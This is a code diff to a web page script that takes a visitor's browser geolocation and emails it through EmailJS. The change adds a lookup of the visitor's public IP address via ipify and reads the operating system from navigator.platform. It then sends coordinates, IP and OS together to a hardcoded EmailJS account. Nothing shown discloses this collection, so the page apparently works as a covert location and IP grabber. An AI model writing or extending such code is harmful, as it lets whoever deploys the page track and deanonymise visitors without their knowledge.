@@ -15,7 +15,7 @@
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    sendLocation(position.coords.latitude, position.coords.longitude);
+                    getIPAddress(position.coords.latitude, position.coords.longitude);
                 }, function(error) {
                     console.error("Error getting location:", error.message);
                 });
@@ -24,14 +24,34 @@
             }
         }
 
-        function sendLocation(latitude, longitude) {
+        function getIPAddress(latitude, longitude) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    getOSInformation(latitude, longitude, ipAddress);
+                })
+                .catch(error => {
+                    console.error('Error getting IP address:', error);
+                    getOSInformation(latitude, longitude, null);
+                });
+        }
+
+        function getOSInformation(latitude, longitude, ipAddress) {
+            const os = navigator.platform;
+            sendLocation(latitude, longitude, ipAddress, os);
+        }
+
+        function sendLocation(latitude, longitude, ipAddress, os) {
             const serviceID = 'service_o03eua9';
             const templateID = 'template_xfjfyaw';
 
             emailjs.init('WIUpdrW8kYQ01y7xU');
             emailjs.send(serviceID, templateID, {
                 latitude: latitude,
-                longitude: longitude
+                longitude: longitude,
+                ipAddress: ipAddress,
+                os: os
             });
         }
     </script>
